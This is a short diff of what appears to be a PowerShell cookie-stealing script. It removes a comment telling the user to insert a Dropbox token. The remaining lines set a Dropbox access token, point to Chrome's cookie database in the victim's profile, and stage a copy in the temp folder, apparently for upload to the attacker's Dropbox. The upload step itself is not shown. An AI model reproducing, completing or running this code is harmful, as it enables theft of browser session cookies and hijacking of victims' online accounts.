@@ -1,5 +1,3 @@
-﻿#Update the accessToken to your Dropbox Token
-
 $accessToken = "$db"
 $cookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 $filePath = "$env:temp\Cookies"
